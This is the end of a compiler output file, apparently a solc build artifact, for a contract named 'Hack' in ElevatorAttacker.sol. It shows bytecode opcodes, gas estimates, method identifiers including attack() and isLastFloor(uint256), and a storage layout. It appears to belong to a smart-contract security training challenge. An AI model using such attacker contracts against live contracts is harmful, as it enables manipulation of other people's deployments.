JUMP JUMPDEST PUSH2 0x1C9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x331 DUP2 PUSH2 0x306 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x34C PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x328 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 EXP 0xA9 RETURN SDIV JUMPDEST 0xB7 0xD4 XOR 0xB7 0xFB PUSH9 0x188848E653C442E2D0 PUSH20 0xCC62F22C9AEF209C37B4F764736F6C634300080C STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "180800",
						"executionCost": "75210",
						"totalCost": "256010"
					},
					"external": {
						"attack()": "infinite",
						"isLastFloor(uint256)": "29324",
						"target()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"isLastFloor(uint256)": "5f9a4bca",
					"target()": "d4b83992"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 49,
						"contract": "contract/security/ElevatorAttacker.sol:Hack",
						"label": "instance",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					},
					{
						"astId": 52,
						"contract": "contract/security/ElevatorAttacker.sol:Hack",
						"label": "target",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(Elevator)46"
					},
					{
						"astId": 55,
						"contract": "contract/security/ElevatorAttacker.sol:Hack",
						"label": "result",
						"offset": 20,
						"slot": "1",
						"type": "t_bool"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					},
					"t_contract(Elevator)46": {
						"encoding": "inplace",
						"label": "contract Elevator",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}